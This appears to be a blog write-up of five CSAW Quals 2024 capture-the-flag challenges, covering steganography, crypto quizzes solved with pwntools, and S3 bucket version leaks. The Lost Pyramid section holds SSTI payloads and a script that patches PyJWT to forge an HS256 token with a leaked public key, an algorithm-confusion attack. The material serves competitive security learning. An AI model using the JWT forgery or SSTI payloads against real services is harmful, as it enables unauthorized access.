---
title: "CSAW Quals 2024"
date: 2024-09-11
draft: true
Tags:
- CTF
- CSAW
---


Welcome to the write-up of CSAW Quals 2024. This document details the CTF challenges I solved during the competition.

#  The Triple Illusion (Forensics)
We were given three .png files. I used ExifTool on one and zsteg on the other two to extract some information from the files, as shown below for all of them.
```
╭─rezy@dev ~/Desktop/images  
╰─➤  exiftool datavsmetadata.png 
ExifTool Version Number         : 12.76
File Name                       : datavsmetadata.png
User Comment                    : Think about a two-input gate that outputs when inputs differ.
XP Comment                      : Now that you know what operation is needed, have you found the right key?
Comment                         : Can you crack my secret? Here's a list of numbers: See what they reveal. 0 0 0 0 0 0 0 0 15 23 23 4 7 0 22 1 23 28 0 18 10 12 0 7 23 2 17 18 21 16 0 0 0 0 0 28 7 16 17 16 6 17 11 0 1 0 21 23 4 24 0 0 0 0 0 0
```

```
╭─rezy@dev ~/Desktop/images  
╰─➤  zsteg -a hibiscus.png | grep {                                           
b1,rgb,lsb,xy       .. text: "ekasemk{oiiik_axiu_xsu_gieiwem_moi_nmivrxks_tmklec_ypxz}"
```

```
╭─rezy@dev ~/Desktop/images  
╰─➤  zsteg -a roses.png | grep {                                              
b1,rgb,lsb,xy       .. text: "csawctf{heres_akey_now_decrypt_the_vigenere_cipher_text}"
```

I then used the key obtained from roses.png to decode the given cipher: `ekasemk{oiiik_axiu_xsu_gieiwem_moi_nmivrxks_tmklec_ypxz}`. The decryption was performed using the key `csawctfheresakeynowdecryptthevigenereciphertext`, after removing the **underscores** and **curly braces**. This process gave us a new key: `csawctf{heres_anew_key_decrypt_the_secretto_reveal_flag}`.

![](Pasted%20image%2020240907141924.png)

With the given key, I used this code:

```python
def xor_decrypt(numbers, key):
    key_ascii = [ord(c) for c in key]
    key_length = len(key_ascii)
    
    decrypted_chars = []
    for i, num in enumerate(numbers):
        key_char = key_ascii[i % key_length]
        # xor
        decrypted_char = num ^ key_char
        
        # printable ASCII range 32 - 126
        decrypted_char = (decrypted_char - 32) % (126 - 32 + 1) + 32
        
        # conv to char
        decrypted_chars.append(chr(decrypted_char))
    
    return ''.join(decrypted_chars)

numbers = [0, 0, 0, 0, 0, 0, 0, 0, 15, 23, 23, 4, 7, 0, 22, 1, 23, 28, 0, 18, 10, 12, 0, 7, 23, 2, 17, 18, 21, 16, 0, 0, 0, 0, 0, 28, 7, 16, 17, 16, 6, 17, 11, 0, 1, 0, 21, 23, 4, 24, 0, 0, 0, 0, 0, 0]
key = "csawctf{heres_anew_key_decrypt_the_secretto_reveal_flag}"

decrypted_message = xor_decrypt(numbers, key)
print('flag is: ', decrypted_message)
```


The code defines a function `xor_decrypt` that decrypts a list of numbers using a key by applying an XOR operation. It converts each character of the key to its ASCII value and uses it to decrypt the corresponding number in the list, ensuring the result falls within the printable ASCII range. Finally, the decrypted values are combined into a string and printed as the result.

And we get our flag as `csawctf{great_work_you_cracked_the_obscured_secret_flag}`.

# Lost Pyramid (Web)
We were given the source code, and upon reviewing it, we found that we needed to access the `/kings_lair` endpoint to obtain the flag. To reach that endpoint, we required a valid JWT token. The source code also revealed that the payload of the JWT must include a valid `KINGSDAY` in the `CURRENT_DATE` setup. Below is the typical JWT for a regular user:

```
{
  "ROLE": "commoner",
  "CURRENT_DATE": "07_09_2024_AD",
  "exp": 96333722311
}
```
The role must be set to "royalty." 

Additionally, the source code indicates that a private key is used to generate the JWT. We can exploit a [algorithm confusion attack to forge a JWT token](https://portswigger.net/web-security/jwt/algorithm-confusion), but we first need to identify the public key. To discover the `KINGSDAY` and `PUBLICKEY`, I found Server-Side Template Injection (SSTI) vulnerability at the `/scarab_room` endpoint using payloads `{{ PUBLICKEY }}` and `{{ KINGSDAY }}`. This revealed the following:

- Public Key: `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2`
- KINGSDAY: `03_07_1341_BC`

So with the information I have, I wrote a python code to forge a JWT token for me:

```python
import jwt
import datetime

public_key = """ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2"""

kingsday = "03_07_1341_BC"

payload = {
    "ROLE": "royalty",
    "CURRENT_DATE": kingsday,
    "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=(365 * 3000))
}

token = jwt.encode(payload, public_key, algorithm="HS256")
print("jwt token:", token)
```

Which, upon running, gives the following error:

```
jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.
```

So, after some research, I found that forging a token like this is no longer possible with the latest version of PyJWT. Instead, you can install `pyjwt==0.4.3` with `pip install pyjwt==0.4.3` and run the code above. However, there is also a hackish solution that someone posted.

![](Pasted%20image%2020240907213447.png)

Then I tried this method and adjusted my code accordingly. This is the final version I created:
```python
import jwt
import datetime

# Prepare an override method to bypass key checks
def prepare_key(key):
    return jwt.utils.force_bytes(key)

# Override HS256's prepare key method to disable the asymmetric key check
jwt.api_jws._jws_global_obj._algorithms['HS256'].prepare_key = prepare_key

# Your public key (which is normally only for verification, not signing)
public_key = """ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2"""

# JWT payload
kingsday = "03_07_1341_BC"
payload = {
    "ROLE": "royalty",
    "CURRENT_DATE": kingsday,
    "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=(365 * 3000))
}

# Generate a JWT using the public key, bypassing the security check
token = jwt.encode(payload, key=public_key, algorithm='HS256')

# Print the JWT token
print("JWT token:", token)
```

Then this gave me a JWT, which I used in Burp Suite to get our flag.
![](Pasted%20image%2020240907213812.png)

# AES Diffusion (Crypto)
We were given a port and an IP to connect to, i.e., `nc diffusion.ctf.csaw.io 5000`. We also received an `aes_simulator.py` file with the following content:

```python
N_ROWS = 4
N_COLS = 4

def CyclicShift(row, shift):
    return row[shift:] + row[:shift]

def ShiftRows(state):
    for row_index in range(N_ROWS):
        state[row_index] = CyclicShift(state[row_index], row_index)
    return state

def BuildExpressionString(column, matrix_row):
    expression = "("
    for (i,coefficient) in enumerate(matrix_row):
        term = str(coefficient) + "*" + column[i]
        should_insert_plus = i < len(matrix_row) - 1
        expression += term
        
        if should_insert_plus:
            expression += " + "
    return expression + ")"

def GetStateColumn(state, column_index):
    column = []
    for row in state:
        column.append(row[column_index])
    return column

def MultiplyColumn(column):
    matrix = [
                [2, 3, 1, 1],
                [1, 2, 3, 1],
                [1, 1, 2, 3],
                [3, 1, 1, 2]
            ]
    
    new_column = []
    for row in matrix:
        new_element = BuildExpressionString(column, row)
        new_column.append(new_element)
    return new_column

def MixColumns(state):
    new_columns = []
    for column_index in range(N_COLS):
        column = GetStateColumn(state, column_index)
        new_column = MultiplyColumn(column)
        new_columns.append(new_column)
    
    return Transpose(new_columns)

def Transpose(matrix):
    return [[matrix[j][i] for j in range(len(matrix))] for i in range(len(matrix[0]))]

def PrettyPrint(matrix):
    for row in matrix:
        print(row)

def PrettyPrint2(matrix):
    for row in matrix:
        for element in row:
            print(element)

state = [["x0", "x4", "x8", "x12"], 
         ["x1", "x5", "x9", "x13"], 
         ["x2", "x6", "x10", "x14"],
         ["x3", "x7", "x11", "x15"]]

def AESRound(state):
    return MixColumns(ShiftRows(state))

def AES(state, rounds):
    for r in range(rounds):
        state = AESRound(state)
    return state

PrettyPrint(AES(state,2))
```

The Python code simulates parts of the AES (Advanced Encryption Standard) encryption process, specifically focusing on **ShiftRows** and **MixColumns** operations. Here's a short explanation:

#### Key Operations:
1. **ShiftRows:**
    
    - Each row of the 4x4 state matrix is shifted to the left by a certain number of positions, where the first row is not shifted, the second row is shifted by 1 position, and so on.
2. **MixColumns:**
    
    - Each column of the state matrix is multiplied by a fixed 4x4 matrix using modular arithmetic (though here, the code generates string expressions to represent this multiplication).

#### Functions:
- **`ShiftRows(state)`**: Shifts rows of the state matrix cyclically.
- **`MixColumns(state)`**: Mixes the columns of the matrix by multiplying each with a fixed transformation matrix.
- **`AESRound(state)`**: Performs one round of AES by applying ShiftRows and MixColumns.
- **`AES(state, rounds)`**: Runs multiple rounds of AES on the state matrix.

#### Example:
The code initializes a 4x4 matrix (the state) with symbolic values (`x0`, `x1`, ..., `x15`), performs 2 rounds of AES, and prints the final matrix.

The goal is to simulate the AES encryption transformations in a simplified, symbolic way, without performing actual byte-level encryption.

## Exploit
I will write a Python script using the `pwntools` library to exploit the AES diffusion challenge. First, I will connect to the server using `nc diffusion.ctf.csaw.io 5000`. Once connected, I will send the following input matrix that simulates part of the AES encryption process:

```
[['x0', 'x4', 'x8', 'x12'], 
 ['x5', 'x9', 'x13', 'x1'], 
 ['x10', 'x14', 'x2', 'x6'], 
 ['x15', 'x3', 'x7', 'x11']]
```
After that, I will input the matrix transformation that applies the MixColumns step in AES. This will look like:
```
[['2*x0 + 3*x5 + 1*x10 + 1*x15', ... (more matrixes here)]
```

Then, I will provide the variables to simulate column mixing and input their respective values. I will also confirm that no other operations need to be done and set a few of the variables to zero to influence the output.

Finally, after providing a formula for transformation and confirming that I do not need further diffusion, I will receive the correct output and retrieve the flag, which will complete the challenge.
So our final script is:

```python
from pwn import *
p=remote("diffusion.ctf.csaw.io",5000)
p.sendlineafter("answer","[['x0', 'x4', 'x8', 'x12'], ['x5', 'x9', 'x13', 'x1'], ['x10', 'x14', 'x2', 'x6'], ['x15', 'x3', 'x7', 'x11']]")
p.sendlineafter("answer","[['2*x0 + 3*x5 + 1*x10 + 1*x15', '2*x4 + 3*x9 + 1*x14 + 1*x3', '2*x8 + 3*x13 + 1*x2 + 1*x7', '2*x12 + 3*x1 + 1*x6 + 1*x11'], ['1*x0 + 2*x5 + 3*x10 + 1*x15', '1*x4 + 2*x9 + 3*x14 + 1*x3', '1*x8 + 2*x13 + 3*x2 + 1*x7', '1*x12 + 2*x1 + 3*x6 + 1*x11'], ['1*x0 + 1*x5 + 2*x10 + 3*x15', '1*x4 + 1*x9 + 2*x14 + 3*x3', '1*x8 + 1*x13 + 2*x2 + 3*x7', '1*x12 + 1*x1 + 2*x6 + 3*x11'], ['3*x0 + 1*x5 + 1*x10 + 2*x15', '3*x4 + 1*x9 + 1*x14 + 2*x3', '3*x8 + 1*x13 + 1*x2 + 2*x7', '3*x12 + 1*x1 + 1*x6 + 2*x11']]")
p.sendlineafter("al order","x0,x5,x10,x15")
p.sendlineafter("al order","x2,x7,x8,x13")
p.sendlineafter("(yes/no)","no")
p.sendlineafter("answer","12")
p.sendlineafter("al order","x0:1,x5:1,x10:1,x15:1")
p.sendlineafter("al order","x0:0,x1:0,x2:0,x3:0,x4:0,x5:0,x6:0,x7:0,x8:0,x9:0,x10:0,x11:0,x12:0,x13:0,x14:0,x15:0")
p.sendlineafter("al order","x0")
p.sendlineafter("tor code","(2*(2*x0 + 3*x1 + 1*x2 + 1*x3) + 3*(1*x0 + 2*x1 + 3*x2 + 1*x3) + 1*(1*x0 + 1*x1 + 2*x2 + 3*x3) + 1*(3*x0 + 1*x1 + 1*x2 + 2*x3))")
p.sendlineafter("iffusion?","no")
print(p.recvall())
```

![](Pasted%20image%2020240908081935.png)
And there we go, we have the flag as `csawctf{1_n0w_und3r5t4nd_435_d1ffu510n}`.

# Diffusion Pop Quiz (Crypto)
Here we are given `ans_extractor.py`:
```python
# To ensure correctly formatted answers for the challenge, use 1-indexed values for the output bits.
# For example, if you have an S-Box of 8 bits to 8 bits, the first output bit is 1, the second is 2, and so forth.
# Your ANF expression will have the variables y1, y2, ..., y8.

# Put your S-Boxes here.

example = [1, 0, 0, 0, 1, 1, 1, 0]

# 3 input bits: 000, 001, 010, 011, 100, 101, 110, 111
# Array indexes: 0    1    2    3    4    5    6    7
# f(x1,x2,x3):   0    1    0    0    0    1    1    1

# Customize the following settings to extract specific bits of specific S-Boxes and have a comfortable visualization of terms.

SYMBOL = 'x'
INPUT_BITS = 3
OUTPUT_BITS = 1
SBOX = example
BIT = 1

# Ignore the functions, we've implemented this for you to save your time.
# Don't touch it, it might break and we don't want that, right? ;)

def get_sbox_result(input_int):
    return SBOX[input_int]

def get_term(binary_string):
    term = ""
    i = 1
    for (count,bit) in enumerate(binary_string):
        if bit == "1":
            term += SYMBOL+str(i)+"*"
        i += 1

    if term == "":
        return "1"

    return term[:-1]

def get_poly(inputs, outputs):
    poly = ""
    for v in inputs:
        if outputs[v]:
            poly += get_term(v) + "+"
    return poly[:-1]

def should_sum(u, v, n):
    for i in range(n):
        if u[i] > v[i]:
            return False

    return True

def get_as(vs, f, n):
    a = {}
    for v in vs:
        a[v] = 0
        for u in vs:
            if should_sum(u, v, n):
                a[v] ^= f[u]

    return a

def get_anf(vs, f, n):
    return get_poly(vs, get_as(vs, f, n))

def get_vs_and_fis_from_sbox(which_fi):
    vs = []
    fis = {}
    for input_integer in range(2**INPUT_BITS):
        sbox_output = get_sbox_result(input_integer)
        input_integer_binary = bin(input_integer)[2:].zfill(INPUT_BITS)
        fis[input_integer_binary] = 0
        sbox_output_binary = bin(sbox_output)[2:].zfill(OUTPUT_BITS)

        vs.append(input_integer_binary)
        fis[input_integer_binary] = int(sbox_output_binary[which_fi-1])

    return vs, fis

def get_anf_from_sbox_fi(which_fi):
    vs, fis = get_vs_and_fis_from_sbox(which_fi)
    poly = get_anf(vs, fis, INPUT_BITS)
    return poly

output = get_anf_from_sbox_fi(BIT)
print(output)
```

This code generates the Algebraic Normal Form (ANF) of a Boolean function corresponding to the output bit(s) of an S-Box. Here's an explanation:

#### Key Concepts:

- **S-Box**: A substitution box used in cryptographic algorithms to perform a substitution of input bits with output bits. It's a non-linear mapping of input to output.
- **ANF (Algebraic Normal Form)**: A way to represent Boolean functions using XOR and AND operations. ANF expressions are polynomials with binary coefficients (0 or 1).
- **Input/Output Bits**: The S-Box takes a fixed number of input bits and returns output bits. In this example, 3 input bits map to 1 output bit.

#### Code Breakdown:

1. **Settings:**
    
    - `SYMBOL = 'x'`: The variables used for the input bits (e.g., `x1`, `x2`, `x3`).
    - `INPUT_BITS = 3`: The S-Box uses 3 input bits (`x1`, `x2`, `x3`), resulting in 8 possible input values (from `000` to `111`).
    - `OUTPUT_BITS = 1`: The S-Box outputs 1 bit.
    - `SBOX = example`: The example S-Box provides a mapping of the 8 possible input values to 1 output bit each.
2. **ANF Extraction Process:**
    
    - **`get_sbox_result(input_int)`**: Returns the S-Box output for a given input.
    - **`get_term(binary_string)`**: Converts a binary input string (e.g., `001`) to a polynomial term (e.g., `x2`).
    - **`get_poly(inputs, outputs)`**: Constructs the ANF polynomial from the terms that contribute to the output.
    - **`get_vs_and_fis_from_sbox(which_fi)`**: Extracts input-output pairs for the S-Box and identifies which output bit is being analyzed (based on `BIT`).
    - **`get_anf(vs, f, n)`**: Combines input-output relationships into the ANF expression using XOR and AND operations.
3. **The Process:**
    
    - The code analyzes the S-Box example, which maps 3 input bits to 1 output bit.
    - For each input bit pattern (from `000` to `111`), it checks the corresponding output bit and builds an ANF representation for that output bit.
    - The final output is a polynomial representing the selected output bit in ANF form.

#### Example:

If we have the following example S-Box:
```
example = [1, 0, 0, 0, 1, 1, 1, 0]  # 3 input bits -> 1 output bit
```

For input `000`, the S-Box outputs `1`. For input `001`, it outputs `0`, and so on.

The goal of the script is to generate a Boolean polynomial for the output bit of the S-Box, based on the input bits.

#### Output:

The script prints the ANF expression for the given output bit. For the example provided, the expression might look something like:

```
x1*x2 + x3 + 1
```

This indicates that the output bit depends on a combination of the input bits in this particular form.

## Exploit

To exploit the diffusion challenge at `diffusion-pop-quiz.ctf.csaw.io`, I will connect to the server and interact with it based on the specific prompts provided.

First, I will establish a connection using `pwn` and input my initial response when prompted. The remote server will ask for an answer to a question, and I will respond with “a”. Following this, I will encounter a query about the answer being correct, to which I will respond with “no”.

Next, when the server asks, “Diffusion matters a lot, right?”, I will send the reply, “Diffusion matters a lot”. Once prompted with the hexadecimal number, I will enter `'0x16'`.

The server will then ask for Boolean expressions. I will systematically input the appropriate expressions, starting with:

- `x3+x2*x3+x1*x2`
- Then, repeat `x3+x2*x3+x1*x2`.
- I will follow this up with the larger expression: `1+x3+x2+x2*x3+x1*x3+x1*x2`.

The final large Boolean expression will be quite complex, but I will input it in response to the server’s prompts.

For the last few steps, I will input the variable order as `x1,x2,x3,x4,x5,x6,x7,x8` and respond with "yes" when the server asks for confirmation.

The server will continue to prompt me for more Boolean expressions, to which I will provide the appropriate responses.
With all these our final script is:

```python
from pwn import *
p=remote("diffusion-pop-quiz.ctf.csaw.io",5000)
p.sendlineafter("?","a")
p.sendlineafter(")","no")
p.sendlineafter("?","Diffusion matters a lot")
p.sendlineafter("with the 0x",'0x16')
p.sendlineafter("given you",'x3+x2*x3+x1*x2')
p.sendlineafter("given you",'x3+x2*x3+x1*x2')
p.sendlineafter("given you",'1+x3+x2+x2*x3+x1*x3+x1*x2')
p.sendlineafter("given you",'x8+x7+x6+x5+x5*x6+x5*x6*x8+x5*x6*x7*x8+x4*x7+x4*x7*x8+x4*x6*x8+x4*x6*x7*x8+x4*x5*x7*x8+x4*x5*x6*x8+x3*x7+x3*x7*x8+x3*x6+x3*x6*x7+x3*x6*x7*x8+x3*x5*x7+x3*x5*x6*x8+x3*x5*x6*x7*x8+x3*x4+x3*x4*x8+x3*x4*x7+x3*x4*x7*x8+x3*x4*x6+x3*x4*x6*x7+x3*x4*x6*x7*x8+x3*x4*x5*x8+x3*x4*x5*x7*x8+x3*x4*x5*x6*x8+x3*x4*x5*x6*x7*x8+x2+x2*x8+x2*x7+x2*x7*x8+x2*x6+x2*x6*x7*x8+x2*x5*x7*x8+x2*x5*x6+x2*x5*x6*x8+x2*x4+x2*x4*x7*x8+x2*x4*x6*x7+x2*x4*x5*x8+x2*x4*x5*x6+x2*x4*x5*x6*x8+x2*x4*x5*x6*x7+x2*x3+x2*x3*x8+x2*x3*x7+x2*x3*x7*x8+x2*x3*x6*x7*x8+x2*x3*x5+x2*x3*x5*x8+x2*x3*x5*x7+x2*x3*x5*x6+x2*x3*x4+x2*x3*x4*x8+x2*x3*x4*x6*x8+x2*x3*x4*x6*x7*x8+x2*x3*x4*x5*x7+x1*x8+x1*x7+x1*x7*x8+x1*x6+x1*x6*x8+x1*x6*x7+x1*x6*x7*x8+x1*x5+x1*x5*x8+x1*x5*x7+x1*x5*x7*x8+x1*x5*x6+x1*x5*x6*x8+x1*x5*x6*x7+x1*x5*x6*x7*x8+x1*x4+x1*x4*x8+x1*x4*x7+x1*x4*x7*x8+x1*x4*x6+x1*x4*x6*x8+x1*x4*x6*x7+x1*x4*x6*x7*x8+x1*x4*x5+x1*x4*x5*x8+x1*x4*x5*x7+x1*x4*x5*x7*x8+x1*x4*x5*x6+x1*x4*x5*x6*x8+x1*x4*x5*x6*x7+x1*x4*x5*x6*x7*x8+x1*x3*x5*x8+x1*x3*x5*x7*x8+x1*x3*x5*x6*x8+x1*x3*x5*x6*x7*x8+x1*x3*x4*x5*x8+x1*x3*x4*x5*x7*x8+x1*x3*x4*x5*x6*x8+x1*x3*x4*x5*x6*x7*x8+x1*x2+x1*x2*x8+x1*x2*x7+x1*x2*x7*x8+x1*x2*x6+x1*x2*x6*x8+x1*x2*x6*x7+x1*x2*x6*x7*x8+x1*x2*x5+x1*x2*x5*x8+x1*x2*x5*x7+x1*x2*x5*x7*x8+x1*x2*x5*x6+x1*x2*x5*x6*x8+x1*x2*x5*x6*x7+x1*x2*x5*x6*x7*x8+x1*x2*x4*x5*x6*x7*x8+x1*x2*x3*x5*x8+x1*x2*x3*x5*x7*x8+x1*x2*x3*x4*x5*x6*x8')
p.sendlineafter("merical order\r\n","x1,x2,x3,x4,x5,x6,x7,x8")
p.sendlineafter(")","yes")
p.sendlineafter("given you",'x7*x8+x6+x6*x7*x8+x5*x7+x5*x6+x5*x6*x7+x4*x7+x4*x6*x7+x4*x6*x7*x8+x4*x5+x4*x5*x7+x4*x5*x6*x8+x4*x5*x6*x7+x3+x3*x7*x8+x3*x6*x7+x3*x5*x8+x3*x5*x7+x3*x5*x7*x8+x3*x5*x6+x3*x5*x6*x7+x3*x5*x6*x7*x8+x3*x4*x6*x8+x3*x4*x6*x7+x3*x4*x5+x3*x4*x5*x7*x8+x3*x4*x5*x6*x8+x3*x4*x5*x6*x7*x8+x2+x2*x8+x2*x7*x8+x2*x6*x8+x2*x6*x7+x2*x6*x7*x8+x2*x5+x2*x5*x8+x2*x5*x7*x8+x2*x4+x2*x4*x8+x2*x4*x6+x2*x4*x6*x8+x2*x4*x6*x7+x2*x4*x6*x7*x8+x2*x4*x5*x8+x2*x4*x5*x7*x8+x2*x4*x5*x6*x8+x2*x4*x5*x6*x7*x8+x2*x3*x7+x2*x3*x6+x2*x3*x6*x7*x8+x2*x3*x5*x8+x2*x3*x5*x6+x2*x3*x5*x6*x8+x2*x3*x5*x6*x7*x8+x2*x3*x4*x6+x2*x3*x4*x6*x7+x2*x3*x4*x5*x7+x2*x3*x4*x5*x7*x8+x2*x3*x4*x5*x6*x8+x2*x3*x4*x5*x6*x7+x1*x7+x1*x7*x8+x1*x6*x8+x1*x5+x1*x5*x7+x1*x5*x7*x8+x1*x5*x6*x7+x1*x5*x6*x7*x8+x1*x4*x7*x8+x1*x4*x6*x7+x1*x4*x5*x7+x1*x4*x5*x7*x8+x1*x4*x5*x6*x7+x1*x4*x5*x6*x7*x8+x1*x3+x1*x3*x8+x1*x3*x7+x1*x3*x7*x8+x1*x3*x6*x8+x1*x3*x5*x7+x1*x3*x5*x6+x1*x3*x5*x6*x7+x1*x3*x5*x6*x7*x8+x1*x3*x4+x1*x3*x4*x8+x1*x3*x4*x7+x1*x3*x4*x7*x8+x1*x3*x4*x6+x1*x3*x4*x6*x7*x8+x1*x3*x4*x5*x7+x1*x3*x4*x5*x6+x1*x2+x1*x2*x8+x1*x2*x7+x1*x2*x6+x1*x2*x5*x6*x7*x8+x1*x2*x4*x7*x8+x1*x2*x4*x6*x8+x1*x2*x4*x5+x1*x2*x4*x5*x7+x1*x2*x4*x5*x6+x1*x2*x4*x5*x6*x8+x1*x2*x4*x5*x6*x7+x1*x2*x4*x5*x6*x7*x8+x1*x2*x3+x1*x2*x3*x8+x1*x2*x3*x6*x7+x1*x2*x3*x5+x1*x2*x3*x5*x8+x1*x2*x3*x5*x6*x8+x1*x2*x3*x5*x6*x7+x1*x2*x3*x4*x6*x8+x1*x2*x3*x4*x5+x1*x2*x3*x4*x5*x8+x1*x2*x3*x4*x5*x7*x8+x1*x2*x3*x4*x5*x6*x8')
p.sendlineafter("merical order\r\n","x1,x2,x3,x4,x5,x6,x7,x8")
p.sendlineafter(")","yes")
p.sendlineafter("given you",'x8+x7+x6*x8+x5*x8+x5*x7*x8+x5*x6+x5*x6*x8+x4*x8+x4*x7+x4*x7*x8+x4*x6*x8+x4*x6*x7+x4*x5+x4*x5*x8+x4*x5*x7+x4*x5*x7*x8+x4*x5*x6+x4*x5*x6*x8+x4*x5*x6*x7+x4*x5*x6*x7*x8+x3+x3*x8+x3*x7*x8+x3*x6*x8+x3*x6*x7+x3*x6*x7*x8+x3*x5*x8+x3*x5*x7+x3*x5*x7*x8+x3*x5*x6*x8+x3*x5*x6*x7+x3*x5*x6*x7*x8+x3*x4*x8+x3*x4*x7+x3*x4*x6+x3*x4*x6*x7*x8+x3*x4*x5+x3*x4*x5*x6*x7+x3*x4*x5*x6*x7*x8+x2*x8+x2*x7*x8+x2*x6*x7+x2*x5*x8+x2*x5*x7*x8+x2*x5*x6+x2*x5*x6*x7+x2*x5*x6*x7*x8+x2*x4*x8+x2*x4*x7*x8+x2*x4*x6*x8+x2*x4*x5+x2*x4*x5*x8+x2*x4*x5*x7*x8+x2*x4*x5*x6+x2*x4*x5*x6*x7+x2*x4*x5*x6*x7*x8+x2*x3+x2*x3*x7+x2*x3*x7*x8+x2*x3*x5+x2*x3*x5*x8+x2*x3*x5*x6+x2*x3*x5*x6*x7*x8+x2*x3*x4*x6+x2*x3*x4*x6*x8+x2*x3*x4*x6*x7+x2*x3*x4*x6*x7*x8+x2*x3*x4*x5+x2*x3*x4*x5*x7+x2*x3*x4*x5*x6*x8+x1+x1*x8+x1*x7*x8+x1*x6*x8+x1*x6*x7+x1*x6*x7*x8+x1*x5*x8+x1*x5*x7+x1*x5*x6+x1*x5*x6*x8+x1*x5*x6*x7*x8+x1*x4+x1*x4*x8+x1*x4*x7+x1*x4*x6*x8+x1*x4*x6*x7+x1*x4*x6*x7*x8+x1*x4*x5*x8+x1*x4*x5*x7*x8+x1*x4*x5*x6+x1*x4*x5*x6*x8+x1*x4*x5*x6*x7*x8+x1*x3*x8+x1*x3*x7+x1*x3*x6*x7+x1*x3*x6*x7*x8+x1*x3*x5*x8+x1*x3*x5*x7+x1*x3*x5*x7*x8+x1*x3*x5*x6*x8+x1*x3*x4*x7+x1*x3*x4*x6+x1*x3*x4*x6*x7+x1*x3*x4*x6*x7*x8+x1*x3*x4*x5*x8+x1*x3*x4*x5*x7*x8+x1*x3*x4*x5*x6*x7+x1*x2+x1*x2*x8+x1*x2*x6+x1*x2*x6*x7+x1*x2*x6*x7*x8+x1*x2*x5*x7+x1*x2*x5*x7*x8+x1*x2*x5*x6*x7+x1*x2*x4+x1*x2*x4*x7*x8+x1*x2*x4*x6+x1*x2*x4*x6*x7+x1*x2*x4*x5*x7+x1*x2*x4*x5*x7*x8+x1*x2*x4*x5*x6+x1*x2*x4*x5*x6*x8+x1*x2*x4*x5*x6*x7+x1*x2*x4*x5*x6*x7*x8+x1*x2*x3*x7+x1*x2*x3*x6+x1*x2*x3*x6*x8+x1*x2*x3*x5+x1*x2*x3*x5*x8+x1*x2*x3*x5*x7+x1*x2*x3*x5*x7*x8+x1*x2*x3*x5*x6+x1*x2*x3*x5*x6*x8+x1*x2*x3*x5*x6*x7*x8+x1*x2*x3*x4+x1*x2*x3*x4*x8+x1*x2*x3*x4*x7+x1*x2*x3*x4*x7*x8+x1*x2*x3*x4*x6*x8+x1*x2*x3*x4*x5+x1*x2*x3*x4*x5*x7*x8+x1*x2*x3*x4*x5*x6+x1*x2*x3*x4*x5*x6*x8+x1*x2*x3*x4*x5*x6*x7')
p.sendlineafter("merical order\r\n","x1,x2,x3,x4,x5,x6,x7,x8")
p.sendlineafter(")","yes")
p.sendlineafter(")","no")
p.sendlineafter("etc.\r\n","y7")
p.sendlineafter("given you",'x7+x6+x6*x8+x5*x8+x5*x6+x4*x8+x4*x7+x4*x7*x8+x4*x6*x7+x4*x5*x6+x4*x5*x6*x8+x4*x5*x6*x7+x4*x5*x6*x7*x8+x3*x7+x3*x6+x3*x6*x7+x3*x5+x3*x5*x6+x3*x4+x3*x4*x8+x3*x4*x7+x3*x4*x6*x8+x3*x4*x6*x7*x8+x3*x4*x5*x7*x8+x3*x4*x5*x6*x8+x2*x8+x2*x7*x8+x2*x6+x2*x6*x7*x8+x2*x5*x7+x2*x5*x6+x2*x5*x6*x8+x2*x4*x8+x2*x4*x6+x2*x4*x6*x7+x2*x4*x6*x7*x8+x2*x4*x5*x8+x2*x4*x5*x7+x2*x4*x5*x6*x7+x2*x4*x5*x6*x7*x8+x2*x3*x8+x2*x3*x6*x8+x2*x3*x6*x7*x8+x2*x3*x5*x7+x2*x3*x5*x6*x8+x2*x3*x4')
p.sendlineafter("etc.\r\n","x1")
p.sendlineafter(")","yes")
p.sendlineafter(")","yes")
print(p.recvall())
```

When we run the script, we receive the flag from the server output as:

![](Pasted%20image%2020240908083806.png)

And our flag is `csawctf{hopefu11y_+he_know1ed9e_diffu5ed_in+o_your_6r@in5}`.

# BucketWars (Web)
They gave us a site [https://bucketwars.ctf.csaw.io](https://bucketwars.ctf.csaw.io/).
When attempting to access any incorrect path, you receive an error message with this S3 bucket link: [https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io/](https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io/). This is actually a positive outcome, as we now have the bucket link. We can use this information to enumerate further and search for potential misconfigurations.

A hint on the front page mentioned 'past versions.' I looked up how to access S3 versions and discovered that appending `/?versions` to the end of the URL would reveal past versions of files in the bucket.

As shown here: [https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io/?versions](https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io/?versions), you can see not only the files that are primarily on the main website but also some version IDs.

From that XML file, I obtained several `versionId` values, which I used in the link as shown below:
![](Pasted%20image%2020240908214908.png)
I replaced all those versionId in the following link:
[https://bucketwars.ctf.csaw.io.s3.amazonaws.com/index_v1.html?versionId=`VersionId`](https://bucketwars.ctf.csaw.io.s3.amazonaws.com/index_v1.html?versionId=CFNz2JPIIJfRlNfnVx8a45jgh0J90KxS)

Out of all, https://bucketwars.ctf.csaw.io.s3.amazonaws.com/index_v1.html?versionId=t6G6A20JCaF5nzz6KuJR6Pj1zePOLAdB gives us:
![](Pasted%20image%2020240908214954.png)

I tried to crack down the passphrase for the given image but no luck. Then I tried to look for other `versionId` and  got this password in DOM:
![](Pasted%20image%2020240908215157.png)

I used this password with steghide tool like:
```
╭─rezy@dev ~  
╰─➤  steghide extract -sf sand-pit-1345726_640.jpg -xf flag.txt -p versions_leaks_buckets_oh_my                     
wrote extracted data to "flag.txt".
╭─rezy@dev ~  
╰─➤  cat flag.txt 
csawctf{lEaKY_Bu4K3tz_oH_m3_04_mY!}
```

# Conclusion
Thank you for reading my write-up for CSAW QUALS 2024. 
Happy hacking! :)
